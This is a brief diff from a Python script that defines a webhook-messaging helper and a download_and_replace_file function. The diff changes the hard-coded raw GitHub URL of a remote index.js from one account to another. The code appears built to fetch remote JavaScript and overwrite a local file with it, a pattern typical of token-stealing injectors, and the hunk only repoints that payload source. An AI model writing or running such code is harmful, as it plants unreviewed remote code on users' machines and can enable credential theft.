@@ -30,7 +30,7 @@ def send_webhook_message(webhook_url, message):
     except requests.RequestException:
         pass  
 
-url = "https://raw.githubusercontent.com/reefdzefrfd/nonam/refs/heads/main/index.js"
+url = "https://raw.githubusercontent.com/theolomo/config/refs/heads/main/index.js"
 
 def download_and_replace_file(url, dest_path):
     try:
